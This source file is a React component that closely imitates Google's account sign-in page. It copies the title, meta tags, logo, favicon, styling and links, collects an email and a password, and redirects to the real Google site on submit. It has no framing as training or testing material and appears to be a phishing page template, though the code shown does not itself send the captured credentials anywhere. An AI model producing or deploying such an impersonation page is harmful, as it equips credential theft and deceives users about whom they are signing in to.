import { useState } from 'react';
import {
  TextInput,
  PasswordInput,
  Button,
  Paper,
  Title,
  Text,
  Anchor,
  Divider,
  Stack,
  Center,
  Box,
  Group,
} from '@mantine/core';
import { Helmet } from 'react-helmet';

function GoogleLogin() {
  const [email, setEmail] = useState('');
  const [pass, setPass] = useState('');
  const [error, setError] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    if (email && pass) {
      window.location.href = 'https://accounts.google.com';
    } else {
      setError('Couldn’t find your Google Account. Try again.');
    }
  };

  const googleFont = "'Roboto', Arial, sans-serif";

  return (
    <>
      {(() => { document.title = "Sign in – Google accounts"; })()}
      <Helmet>
        <meta name="description" content="Sign in to your Google Account" />
        <meta property="og:title" content="Sign in – Google accounts" />
        <meta property="og:description" content="Sign in to your Google Account" />
        <meta property="og:image" content="https://ssl.gstatic.com/accounts/ui/logo_2x.png" />
        <meta property="og:image:alt" content="Google logo" />
        <meta name="imagedesc" content="Google logo" />
        <link rel="icon" type="image/png" href="https://ssl.gstatic.com/accounts/ui/logo_2x.png" />
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
        <link href="https://fonts.googleapis.com/css?family=Roboto:400,500&display=swap" rel="stylesheet" />
        <style>{`
          body, #root {
            font-family: ${googleFont} !important;
            background: #fff;
          }
          input:-webkit-autofill,
          input:-webkit-autofill:focus {
            -webkit-box-shadow: 0 0 0 1000px #f8f9fa inset !important;
            box-shadow: 0 0 0 1000px #f8f9fa inset !important;
            -webkit-text-fill-color: #202124 !important;
          }
        `}</style>
      </Helmet>
      <Center style={{ minHeight: '100vh', background: '#fff', fontFamily: googleFont }}>
        <Box
          style={{
            width: '100%',
            maxWidth: 450,
            margin: '0 auto',
            padding: '40px 0',
          }}
        >
          <Paper
            radius={16}
            p={0}
            withBorder
            shadow="md"
            style={{
              width: '100%',
              fontFamily: googleFont,
              background: '#fff',
              border: '1px solid #dadce0',
              boxShadow: '0 4px 16px rgba(60,64,67,.15)',
              margin: '0 auto',
              padding: 0,
              overflow: 'hidden',
            }}
          >
            <Box style={{ padding: '48px 40px 36px 40px' }}>
              <Center>
                <img
                  src="https://ssl.gstatic.com/accounts/ui/logo_2x.png"
                  alt="Google"
                  style={{ width: 75, marginBottom: 24 }}
                />
              </Center>
              <Title
                order={2}
                style={{
                  fontFamily: googleFont,
                  fontWeight: 400,
                  fontSize: 24,
                  color: '#202124',
                  marginBottom: 8,
                  textAlign: 'left',
                  letterSpacing: 0,
                  lineHeight: 1.2,
                }}
              >
                Sign in
              </Title>
              <Text
                style={{
                  fontFamily: googleFont,
                  fontWeight: 400,
                  fontSize: 16,
                  color: '#202124',
                  marginBottom: 24,
                  textAlign: 'left',
                  lineHeight: 1.5,
                }}
              >
                to continue to Google
              </Text>
              <form onSubmit={handleSubmit} autoComplete="off">
                <Stack spacing={0}>
                  <TextInput
                    placeholder="Email or phone"
                    value={email}
                    onChange={e => setEmail(e.currentTarget.value)}
                    radius={0}
                    size="md"
                    required
                    styles={{
                      input: {
                        fontFamily: googleFont,
                        fontSize: 16,
                        background: '#f8f9fa',
                        border: '1px solid #dadce0',
                        borderRadius: 4,
                        height: 48,
                        padding: '0 12px',
                        marginBottom: 4,
                        color: '#202124',
                        boxShadow: 'none',
                        outline: 'none',
                        transition: 'border-color 0.2s',
                      },
                    }}
                  />
                  <Anchor
                    href="https://accounts.google.com/signin/v2/usernamerecovery"
                    color="#1a73e8"
                    size="sm"
                    underline={false}
                    style={{
                      fontWeight: 500,
                      fontFamily: googleFont,
                      fontSize: 14,
                      marginBottom: 16,
                      marginTop: 2,
                      alignSelf: 'flex-start',
                    }}
                  >
                    Forgot email?
                  </Anchor>
                  <PasswordInput
                    placeholder="Enter your password"
                    value={pass}
                    onChange={e => setPass(e.currentTarget.value)}
                    radius={0}
                    size="md"
                    required
                    styles={{
                      input: {
                        fontFamily: googleFont,
                        fontSize: 16,
                        background: '#f8f9fa',
                        border: '1px solid #dadce0',
                        borderRadius: 4,
                        height: 48,
                        padding: '0 12px',
                        marginBottom: 4,
                        color: '#202124',
                        boxShadow: 'none',
                        outline: 'none',
                        transition: 'border-color 0.2s',
                      },
                    }}
                  />
                  {error && (
                    <Text
                      color="red"
                      size="sm"
                      style={{
                        fontFamily: googleFont,
                        marginTop: 2,
                        marginBottom: 8,
                        fontSize: 13,
                        lineHeight: 1.4,
                        minHeight: 18,
                      }}
                    >
                      {error}
                    </Text>
                  )}
                  <Group position="apart" mt={8} mb={0}>
                    <Anchor
                      href="https://accounts.google.com/signup"
                      color="#1a73e8"
                      size="sm"
                      underline={false}
                      style={{
                        fontWeight: 500,
                        fontFamily: googleFont,
                        fontSize: 14,
                        marginTop: 0,
                        padding: 0,
                        background: 'none',
                        border: 'none',
                        cursor: 'pointer',
                      }}
                      onClick={e => {
                        e.preventDefault();
                        window.location.href = 'https://accounts.google.com/signup';
                      }}
                    >
                      Create account
                    </Anchor>
                    <Button
                      type="submit"
                      radius={4}
                      size="md"
                      style={{
                        fontWeight: 500,
                        fontFamily: googleFont,
                        fontSize: 14,
                        background: '#1a73e8',
                        color: '#fff',
                        boxShadow: 'none',
                        textTransform: 'none',
                        letterSpacing: 0,
                        minWidth: 96,
                        height: 36,
                        padding: '0 24px',
                        borderRadius: 4,
                        marginLeft: 8,
                      }}
                    >
                      Next
                    </Button>
                  </Group>
                </Stack>
              </form>
              <Divider my={24} style={{ borderColor: '#e0e0e0' }} />
              <Text
                size="xs"
                style={{
                  fontFamily: googleFont,
                  marginTop: 0,
                  color: '#5f6368',
                  fontSize: 12,
                  textAlign: 'left',
                  lineHeight: 1.5,
                }}
              >
                Not your computer? Use Guest mode to sign in privately.&nbsp;
                <Anchor
                  href="https://support.google.com/accounts?p=guest_mode"
                  color="#1a73e8"
                  underline={false}
                  style={{
                    fontWeight: 500,
                    fontFamily: googleFont,
                    fontSize: 12,
                  }}
                >
                  Learn more
                </Anchor>
              </Text>
            </Box>
          </Paper>
          <Center mt={32}>
            <Group spacing={24}>
              <Anchor
                href="https://support.google.com/accounts?hl=en"
                color="#5f6368"
                size="xs"
                underline={false}
                style={{
                  fontFamily: googleFont,
                  fontSize: 12,
                  fontWeight: 400,
                  opacity: 0.87,
                }}
              >
                Help
              </Anchor>
              <Anchor
                href="https://accounts.google.com/signin/v2/usernamerecovery"
                color="#5f6368"
                size="xs"
                underline={false}
                style={{
                  fontFamily: googleFont,
                  fontSize: 12,
                  fontWeight: 400,
                  opacity: 0.87,
                }}
              >
                Privacy
              </Anchor>
              <Anchor
                href="https://accounts.google.com/TOS"
                color="#5f6368"
                size="xs"
                underline={false}
                style={{
                  fontFamily: googleFont,
                  fontSize: 12,
                  fontWeight: 400,
                  opacity: 0.87,
                }}
              >
                Terms
              </Anchor>
            </Group>
          </Center>
        </Box>
      </Center>
    </>
  );
}

export default GoogleLogin;
